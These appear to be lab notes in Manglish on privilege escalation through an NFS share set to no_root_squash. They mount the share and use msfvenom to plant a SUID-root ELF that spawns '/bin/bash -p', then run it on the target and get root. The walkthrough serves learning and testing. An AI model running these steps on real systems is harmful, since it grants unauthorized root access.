Network File System - we also call it as sun NFS.nfs use chyunath remote server il irikuna files ne access chyanum store chyanum aan.youtube il nokiyapol oruthan paranjath nfs inekal better smb/samba aan enan.linux to linux enterprise organizations in nfs aan better.in lab ilek veram --
NFS vazhi namuk nammude system thilek share mount chyam from the linux server.so mount chyththin shesham aa mount chytha share il namude local system thil ninum root user aayi oru file undakiyal aa file server ilum root owner/power il thane run aakum.so namal undakuna file malicious aanengil ath aa nfs ine bhadhikum.ith prevent chyan nfs root_squash use chyunu.root_squash prevents a local root user to create a file as owner of root.so whenever we make a file as root on our local system and if root_squash is enables in the configuration of that particular share then we wont be able to utilize that file that we created.bqz the user group of that particular file is going to be a nobody.root_squash simply changed the owner of the particular file to nobody and it will make that file useless and we wont be able to utilize it.
          pakshe ithupole thane no_root_squash um und.in a misconfigured nfs share if
no_root_squash is enabled then opposite will happen.athayath root user aayi file undakiyal nfs server ilum ath root aayi thane varum.so ith ariyan nfs inte misconfiguration file nokanam:
   -->cat /etc/exports
ithil nokumbol kanan sathikunath /tmp directory il no_root_squash enn kanam.so athinartham ee share vulnerable aanu karanam ith musconfigured aayi aan kidakunath.so namuk ee /tmp directory namude kali ilek mount chyam
aadyam namude kali il roo user aakuka enit ee server il ninum enthoke share available aan mount chyan enn nokanam
     -->showmount -e [target ip]
apol result il kanam /tmp enn.so it is confirmed namuk ith localsystem ilek aakamen.so aadyam oru file undakanam enit ee share mount chyam
            -->mkdir /tmp/nfs
			-->cd /tmp
			-->mount -o rw,vers=2 [target ip]:/tmp /tmp/nfs
			-->cd /tmp/nfs
			-->ls -ls
namuk kanam aa share il ulla files.ithupole namude target machine ilum poi nokuka -->cd /tmp enn so avidem ividem ulla files onn thane enn kanam.so athinartham namal correct aayi share mount chythu ennan.
ini msf venom use chyth payload undakuka.enit athin permission kodukanam.enit ath target machine inl poi execute chythamathi aayikolum
      -->msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
	  -->chmod +xs /tmp/nfs/shell.elf
	  -tager machine il -->/tmp/shell.elf
	  >whoami        //root